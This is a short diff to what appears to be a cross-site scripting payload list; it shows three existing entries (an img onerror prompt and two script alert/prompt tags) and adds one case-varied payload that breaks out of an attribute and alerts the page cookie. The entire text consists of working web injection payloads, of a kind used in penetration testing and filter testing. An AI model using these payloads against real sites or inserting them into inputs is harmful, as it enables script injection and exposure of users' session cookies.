@@ -3,3 +3,4 @@
 <img+src=x+onerror=prompt("SCAMPATEL")>
 <script>alert(document.domain)</script>
 <script>prompt(document.domain)</script>
+"><sCriPt>alErT(cookie)</script>
